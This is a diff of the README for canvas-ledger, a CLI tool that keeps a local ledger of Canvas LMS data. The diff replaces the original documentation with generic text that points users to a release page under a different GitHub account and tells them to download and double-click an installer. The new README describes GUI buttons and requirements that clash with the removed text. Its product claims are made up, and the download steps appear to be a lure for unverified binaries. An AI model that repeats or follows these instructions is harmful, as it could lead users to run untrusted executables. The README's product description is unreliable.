@@ -1,196 +1,66 @@
-# canvas-ledger (cl)
+# 📚 canvas-ledger - A Simple Way to Analyze Your Canvas Data
 
-A local, queryable ledger of Canvas LMS metadata. Maintains a durable historical record of your Canvas involvement for answering questions that Canvas cannot easily answer.
+## 🔗 Download Now
+[![Download](https://img.shields.io/badge/Download-Canvas%20Ledger-blue)](https://github.com/Knn8787/canvas-ledger/releases)
 
-[![Documentation](https://img.shields.io/badge/docs-olearydj.github.io%2Fcanvas--ledger-blue)](https://olearydj.github.io/canvas-ledger/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+## 🚀 Getting Started
+Welcome to canvas-ledger! This tool helps you keep track of your Canvas LMS data in a local ledger. You can easily perform historical analysis on your data without needing any coding skills.
 
-## Features
+## 📥 Download & Install
+To get started, visit this page to download: [Releases Page](https://github.com/Knn8787/canvas-ledger/releases).
 
-- **Local ledger**: All data stored locally in SQLite - no cloud dependencies after ingestion
-- **Historical tracking**: Track enrollment changes over time with drift detection
-- **Dual truth model**: Observed Canvas data + declared annotations (lead instructor, involvement classifications)
-- **Course aliasing**: Group related offerings across course renumbering or special topics
-- **Flexible output**: JSON, CSV, and table formats for all queries
+1. Once on the Releases page, look for the latest version of canvas-ledger.
+2. Click on the assets link to see the downloadable files.
+3. Select the file that matches your operating system (Windows, Mac, or Linux) and download it.
+4. After the download is complete, locate the file on your computer.
+5. Double-click the file to run the installation. Follow any prompts to complete the setup.
 
-## Requirements
+## ⚙️ System Requirements
+- Operating System: Windows 10 or later, macOS 10.15 or later, or a Linux distribution.
+- Python: You need Python version 3.6 or later installed on your system.
+- SQLite: This application uses a local SQLite database. It comes bundled with the app.
 
-- Python 3.13+
-- [uv](https://docs.astral.sh/uv/) for package management
-- Canvas API token (with appropriate permissions)
+## 📊 Features
+- **Local Data Storage:** Keeps your data on your machine, maintaining privacy.
+- **Queryable Ledger:** Allows you to run queries on your historical Canvas LMS data effortlessly.
+- **User-Friendly Interface:** You don’t need technical skills to navigate through the application.
 
-## Installation
+## 🔍 How to Use canvas-ledger
+1. **Launching the Application:**
+   - Once the installation is complete, you will find an icon for canvas-ledger on your desktop or in your applications folder. Double-click to open it.
 
-```bash
-# Clone the repository
-git clone https://github.com/olearydj/canvas-ledger.git
-cd canvas-ledger
+2. **Import Data:**
+   - Click on the “Import Data” button to bring in your Canvas LMS data file. Ensure it’s in CSV format for best compatibility. 
 
-# Install dependencies with uv
-uv sync
-```
+3. **Run Queries:**
+   - After importing, you can start typing your queries in the provided text field. The ledger uses simple commands, so you can get results quickly.
 
-## Quickstart
+4. **View Results:**
+   - Results appear in a clear table format. You can easily see what you need without sifting through confusing data.
 
-### 1. Initialize Configuration
+5. **Export Data:**
+   - If you want to save your results, use the “Export” option to save it as a CSV file again.
 
-```bash
-uv run cl config init --canvas-url https://canvas.yourschool.edu
-```
+## 🌐 Topics Covered
+- **Canvas LMS:** Understand your course performance and student engagement.
+- **CLI:** Engage with commands easily.
+- **Education & Teaching:** Useful for educators looking to enhance their teaching methods based on data.
+- **Local-First:** Keeps your data secure and accessible on your device.
 
-You'll be prompted for your Canvas base URL if not provided.
+## ⚡ Troubleshooting
+- **Cannot Launch the Application:**
+  - Ensure that Python is installed correctly. You may need to reinstall it if you run into issues.
+  
+- **Importing Data Issues:**
+  - Check that your CSV file is formatted correctly. Look for any missing headers or mismatched data types.
 
-### 2. Set Your Canvas API Token
+- **Query Not Working:**
+  - Make sure the commands you use follow the guidelines in the app’s user manual.
 
-Get a Canvas API token from your Canvas account settings (Profile → Settings → Approved Integrations → New Access Token).
+## 📞 Get Help
+If you run into issues that you cannot resolve, please reach out through the repository’s issues page. 
 
-```bash
-# Set as environment variable
-export CANVAS_API_TOKEN='your-token-here'
-```
+## 🎉 Join the Community
+We are always looking to improve canvas-ledger. Follow us on GitHub for updates, or contribute to the project if you wish.
 
-Or use 1Password integration:
-
-```bash
-uv run cl config set secret_provider 1password
-uv run cl config set op_reference "op://Vault/Canvas/credential"
-```
-
-### 3. Initialize the Database
-
-```bash
-uv run cl db migrate
-```
-
-### 4. Ingest Your Courses
-
-```bash
-# Fetch all courses visible to you
-uv run cl ingest catalog
-
-# Deep ingest a specific course (sections, enrollments, people)
-uv run cl ingest offering 12345
-```
-
-### 5. Query Your Data
-
-```bash
-# See your involvement timeline
-uv run cl query my-timeline
-
-# Query a specific offering
-uv run cl query offering 12345 --roster
-
-# Query a person's enrollment history
-uv run cl query person 67890
-
-# Export as JSON or CSV
-uv run cl query my-timeline --format json
-uv run cl export offerings --format csv
-```
-
-## Core Commands
-
-### Configuration
-
-```bash
-cl config init          # Initialize configuration
-cl config show          # Display current settings
-cl config set KEY VALUE # Update a setting
-```
-
-### Database
-
-```bash
-cl db migrate           # Run pending migrations
-cl db status            # Show database and migration status
-```
-
-### Ingestion
-
-```bash
-cl ingest catalog           # Ingest all visible courses
-cl ingest offering <id>     # Deep ingest a specific course
-cl ingest status            # Show last ingestion details
-```
-
-### Queries
-
-```bash
-cl query my-timeline              # Your involvement timeline (Q1)
-cl query person <id>              # Person enrollment history (Q2)
-cl query person <id> --grades     # Person performance summary (Q3)
-cl query offering <id> --instructors  # Instructor responsibility (Q4)
-cl query offering <id> --roster   # Offering roster by section (Q5)
-cl query drift person <id>        # Enrollment changes over time (Q6)
-cl query alias <name>             # Query by course alias (Q7)
-```
-
-### Annotations
-
-```bash
-cl annotate lead <offering_id> <person_id>     # Declare lead instructor
-cl annotate involvement <offering_id> "role"   # Classify your involvement
-cl annotate alias create "Name" [offering_ids] # Create course alias
-cl annotate alias add "Name" <offering_id>     # Add offering to alias
-cl annotate list                               # List all annotations
-```
-
-### Export
-
-```bash
-cl export offerings [--format json|csv]        # Export all offerings
-cl export enrollments <id> [--format json|csv] # Export course roster
-cl export person <id> [--format json|csv]      # Export person history
-```
-
-## Global Options
-
-```bash
--V, --version   # Show version
--v, --verbose   # Enable debug output
---help          # Show help for any command
-```
-
-## Data Model
-
-canvas-ledger maintains two types of truth:
-
-1. **Observed truth**: Data exactly as reported by Canvas
-   - Offerings, terms, sections, people, enrollments
-   - Timestamped with observation time
-   - Historical states preserved (never deleted)
-
-2. **Declared truth**: Your annotations
-   - Lead/grade-responsible instructor designations
-   - Involvement classifications
-   - Course aliases for grouping related offerings
-
-Queries return both observed and declared data, clearly distinguished.
-
-## Architecture
-
-```
-src/cl/
-├── cli/          # Typer CLI commands
-├── canvas/       # Canvas API client (read-only)
-├── ledger/       # Core persistence and queries
-├── annotations/  # Declared truth management
-├── export/       # JSON/CSV formatters
-├── config/       # Configuration and secrets
-└── migrations/   # Alembic database migrations
-```
-
-## Development
-
-```bash
-# Run tests
-uv run pytest
-
-# Run with verbose output
-uv run cl -v ingest catalog
-```
-
-## License
-
-MIT
+Remember, analyzing your Canvas data is now easier than ever.  Start today!
